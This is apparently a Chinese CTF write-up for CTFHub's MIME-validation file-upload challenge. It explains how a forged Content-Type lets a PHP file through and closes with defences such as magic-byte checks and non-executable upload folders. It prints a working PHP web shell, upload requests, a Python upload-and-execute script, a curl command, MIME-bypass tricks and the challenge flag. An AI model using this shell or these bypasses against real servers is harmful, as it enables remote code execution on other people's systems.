---
layout: post
title: CTFHub - 文件上传 MIME 验证 Writeup
platform: ctfhub
date: 2026-10-23 17:51:00 +0800
categories: CTF
---

CTFHub - 文件上传 MIME 验证 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → MIME 验证）
- 题型：Web
- 考点：**Content-Type 伪造**、客户端数据不可信


```text
页面标题：CTFHub 文件上传 - MIME验证
没有源码泄露，需要自己探测

★ 探测过程（用不同的 Content-Type 传同一个 shell.php）：

    文件名      Content-Type             结果
    ──────────────────────────────────────────────────────
    shell.php   application/x-php        被拦（页面无提示）
    shell.php   text/plain               被拦
    shell.php   image/jpeg               ★ 上传成功
    shell.php   image/png                ★ 上传成功
    shell.php   image/gif                ★ 上传成功
    shell.jpg   image/jpeg               上传成功（但不会执行）

    ★ 结论：服务器只检查 Content-Type 是不是图片类型
    ★ 文件名后缀完全不看！

★ 绕过：

    POST /  multipart/form-data

    ------boundary
    Content-Disposition: form-data; name="submit"

    Submit
    ------boundary
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: image/jpeg          ← ★ 关键：伪装成图片

    <?php system($_GET['cmd']); ?>
    ------boundary--

    → 上传成功，路径 upload/shell.php

★ 验证执行：

    GET /upload/shell.php?cmd=id
    → uid=33(www-data) gid=33(www-data) groups=33(www-data)    ✅ RCE

★ 找 flag：

    ?cmd=ls -la /var/www/html
    → flag_3140828913.php

    ?cmd=cat /var/www/html/flag_3140828913.php
    → <?php // ctfhub{44de1db963e03620600898c6}

flag         : ctfhub{44de1db963e03620600898c6}
```

二、题目分析

**① MIME 是什么**

```
MIME = Multipurpose Internet Mail Extensions
（最早用于邮件，后来用于描述"文件是什么类型"）

常见 MIME：
    text/html              网页
    text/plain             纯文本
    image/jpeg             JPEG 图片
    image/png              PNG 图片
    image/gif              GIF 图片
    application/pdf        PDF
    application/x-php      PHP 脚本
```

**在 HTTP 里，MIME 就是 `Content-Type` 头**：

```http
# 普通的 POST
Content-Type: application/x-www-form-urlencoded

# 上传文件时（每个文件部分都有自己的 Content-Type）
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

------WebKitFormBoundaryxxx
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← ★ 这个文件的 MIME 类型
```

**② 后端的 MIME 校验长什么样**

```php
if ($_FILES['file']['type'] == 'image/jpeg' ||
    $_FILES['file']['type'] == 'image/png' ||
    $_FILES['file']['type'] == 'image/gif') {
    move_uploaded_file(...);
} else {
    echo "文件类型不匹配";
}
```

**★ 致命问题**：`$_FILES['file']['type']` 的值来自**浏览器发来的 `Content-Type` 头** ——
这是**客户端自己说的**，服务器没法验证。

**③ 为什么这个校验等于没有**

```text
浏览器发的请求是【攻击者可以完全控制】的

    你可以：
        ① 用 Burp 抓包 → 改 Content-Type
        ② 用 Python/curl 直接构造请求 → 想写什么写什么
        ③ 甚至用文件选择框选 .php 文件，再抓包改 MIME

    ★ 服务器信的"Content-Type"是"攻击者自己填的一张纸"
```

**对比**：

| 校验方式 | 数据来源 | 能不能信 |
|---|---|---|
| 扩展名 | 文件名（客户端传的） | ❌ 不可信（但至少文件名有意义）|
| **MIME（Content-Type）** | **客户端请求头** | ❌ **完全不可信** |
| 文件头（魔数） | 文件真实内容 | ✅ 相对可信（要读文件） |
| 服务端重命名 | 服务端生成 | ✅ 可信 |

**★ MIME 校验是"最假"的校验** —— 因为它连文件内容都不看，只看客户端填的一个字符串。

**④ 正确的 MIME 校验应该怎么做**

```php
// ❌ 错误：只看客户端说的
if ($_FILES['file']['type'] == 'image/jpeg') { ... }

// ✅ 正确：自己读文件内容判断
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($real_mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die("不是真的图片");
}
```

**`finfo_file` 会读文件的"魔数"（magic bytes）**：

```
JPEG 文件开头：FF D8 FF
PNG  文件开头：89 50 4E 47 0D 0A 1A 0A
GIF  文件开头：47 49 46 38（"GIF8"）
```

**★ 这是真正"读内容"的判断，改 Content-Type 骗不过去。**

**⑤ 本题的传输细节**

**一个 multipart 上传请求的结构**：

```http
POST / HTTP/1.1
Host: challenge-xxx:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
Content-Length: 456

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryABC123--
```

**★ 注意两个东西的区别**：

```
filename="shell.php"        ← 文件名（决定服务器存成什么名字、后缀是什么）
Content-Type: image/jpeg    ← MIME 声明（本题服务器只检查这个）
```

**本题的荒谬之处**：

```
文件名写着 .php（服务器会照这个名字保存，之后当 PHP 执行）
MIME 写着 image/jpeg（服务器检查这个，通过了）
→ 上传成功，得到一个可执行的 PHP 文件
```

三、解题步骤

**方法一：Burp 改包（最直观）**

**第 1 步：正常上传一个图片，抓包**

```
① Burp → Proxy → Intercept on
② 浏览器选一个 shell.php 文件
③ 点 Submit
④ Burp 拦到请求：

    ------WebKitFormBoundaryxxx
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: application/x-php        ← 会被拦

    <?php system($_GET['cmd']); ?>
    ------WebKitFormBoundaryxxx--

⑤ 把 Content-Type 改成 image/jpeg
⑥ Forward
```

**第 2 步：看响应**

```
上传成功
上传文件相对路径
upload/shell.php
```

**第 3 步：访问执行**

```
http://challenge-xxx:10800/upload/shell.php?cmd=id
→ uid=33(www-data)...
```

**第 4 步：找 flag**

```
?cmd=ls -la /var/www/html
→ flag_3140828913.php

?cmd=cat /var/www/html/flag_3140828913.php
→ <?php // ctfhub{...}
```

---

**方法二：Python 脚本（自动化）**

```python
import uuid, urllib.request, urllib.parse

BASE = "http://challenge-xxx:10800"
OPEN = "<" + "?" + "php "
CLOSE = "?" + ">"


def upload(filename, content, ctype="image/jpeg"):
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    body = (("--%s\r\n" % boundary).encode()
            + b'Content-Disposition: form-data; name="submit"\r\n\r\nSubmit\r\n'
            + ("--%s\r\n" % boundary).encode()
            + ('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename).encode()
            + ("Content-Type: %s\r\n\r\n" % ctype).encode()      # ★ 伪装
            + content.encode() + b"\r\n"
            + ("--%s--\r\n" % boundary).encode())
    req = urllib.request.Request(BASE + "/", data=body, method="POST",
            headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
    return urllib.request.urlopen(req).read().decode()


# ① 传木马（MIME 伪装成 jpeg）
print(upload("shell.php", OPEN + "system($_GET['cmd']); " + CLOSE, "image/jpeg"))

# ② 执行
u = BASE + "/upload/shell.php?cmd=" + urllib.parse.quote("ls -la /var/www/html")
print(urllib.request.urlopen(u).read().decode())
```

**★ 关键就一行**：`"Content-Type: %s\r\n\r\n" % "image/jpeg"`

---

**方法三：curl 一行命令**

```bash
curl -X POST "http://challenge-xxx:10800/" \
     -F "submit=Submit" \
     -F "file=@shell.php;type=image/jpeg;filename=shell.php"
```

**分解**：

```
-F "file=@shell.php"          上传本地 shell.php
-F "...;type=image/jpeg"      把 Content-Type 设成 image/jpeg  ★ 绕过点
-F "...;filename=shell.php"   保存的文件名（.php，之后能执行）
```

**★ curl 的 `;type=` 参数就是改 MIME 的开关。**

---

**方法四：改造本地文件（不抓包）**

```
思路：把"真图片"和"PHP 代码"拼在一起

① 准备一个小 jpg
② 把 PHP 代码追加到后面：
   Windows: copy /b normal.jpg + shell.php shell.jpg
   Linux:   cat normal.jpg shell.php > shell.jpg

③ 上传 shell.jpg（Content-Type 自动是 image/jpeg）

★ 但这个方案需要配合"解析漏洞"或 .htaccess 才能执行
   本题因为后缀不检查，直接传 shell.php + 改 MIME 更快
```

四、延伸知识

**① 文件上传的"三层校验"**

```text
第 1 层：扩展名（filename）
    → 可被"改文件名"绕过（大小写、特殊后缀、.htaccess）

第 2 层：MIME（Content-Type）  ← 本题
    → 可被"改请求头"绕过（完全不可信）

第 3 层：文件内容（魔数/文件头）
    → 相对可信，但可被"图片马"绕过（拼接）

第 4 层（真正有效）：服务端重命名 + 上传目录禁止执行
    → 无法绕过（除非有解析漏洞）
```

**② `$_FILES` 数组里各个字段的可信度**

```php
$_FILES['file']['name']      // 原始文件名 —— 客户端可控 ❌
$_FILES['file']['type']      // MIME 类型 —— 客户端可控 ❌❌（最不可信）
$_FILES['file']['size']      // 大小 —— 客户端可控 ❌
$_FILES['file']['tmp_name']  // 临时文件路径 —— 服务器生成 ✅
$_FILES['file']['error']     // 错误码 —— 服务器生成 ✅
```

**★ 只有 `tmp_name` 是可信的**（服务器自己生成的路径）。

**③ 图片马怎么制作**

**Windows**：

```cmd
copy /b normal.jpg + shell.php shell.jpg
```

**Linux**：

```bash
cat normal.jpg shell.php > shell.jpg
```

**验证**：

```bash
# 看文件头（应该是 jpg 的 FF D8 FF）
xxd shell.jpg | head -2

# 看文件尾（应该是 PHP 代码）
tail -c 60 shell.jpg
```

**如何让它执行**：

```
① 配合 .htaccess（让 .jpg 当 php）
② 配合文件包含漏洞（include 'shell.jpg'）
③ 配合 Apache 多后缀解析（shell.php.jpg）
④ 配合 Nginx 解析漏洞
```

**④ 其他绕过 MIME 的技巧**

```text
① 直接改 Content-Type（本题）
② 用大小写：Image/JPEG（有些校验区分大小写）
③ 用双写：image/jpeg,image/png
④ 用空格/image/jpeg（有些 WAF 处理不当）
⑤ 用 image/jpeg; （加参数）
⑥ 用 image/jpg（非标准但有些服务端认）
```

**⑤ 防护**

```text
① ★ 上传后重命名（随机名 + 白名单后缀）
    $new = bin2hex(random_bytes(16)) . '.jpg';
    → 就算传了 shell.php，也变成 xxxx.jpg，不能执行

② ★ 上传目录禁止执行
    → 最有效

③ ★ 用 finfo_file() 读真实类型（不是看 Content-Type）
    $mime = finfo_file(finfo_open(FILEINFO_MIME_TYPE), $tmp);

④ ★ 扩展名白名单（不是黑名单）

⑤ 上传目录放在 Web 根之外

⑥ 图片二次处理（重新生成缩略图 → 里面的 PHP 代码被丢弃）
    ★ 这是防图片马最彻底的办法
```

五、总结

- **本题核心：服务器只信客户端填的 `Content-Type` → 改成 `image/jpeg` 就绕过。**
- 一行关键：

```http
Content-Type: image/jpeg      ← 文件名还是 shell.php
```

- **三个必记要点**：

```text
① Content-Type 是客户端自己填的，完全不可信
② 本题荒谬之处：文件名 .php（会执行）+ MIME image/jpeg（通过校验）
③ 真正的 MIME 校验必须用 finfo_file() 读文件内容
```

- **实测 flag**：

```text
ctfhub{44de1db963e03620600898c6}
（在 /var/www/html/flag_3140828913.php 里）
```


**手工复现要点**：

```text
· 探测方法：同一个 shell.php，换不同 Content-Type 传
  看哪个能过（image/jpeg、image/png、image/gif 通常都行）
· Burp：抓包 → 改 Content-Type → Forward
· curl：-F "file=@shell.php;type=image/jpeg;filename=shell.php"
· 上传后路径会告诉你（upload/shell.php）
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────┐
│  扩展名校验 → 改文件名绕过                         │
│  MIME 校验  → 改 Content-Type 绕过（本题）        │
│  文件头校验 → 图片马绕过                           │
│  三重校验全上 + 上传目录禁止执行 → 基本安全         │
└──────────────────────────────────────────────────┘
```
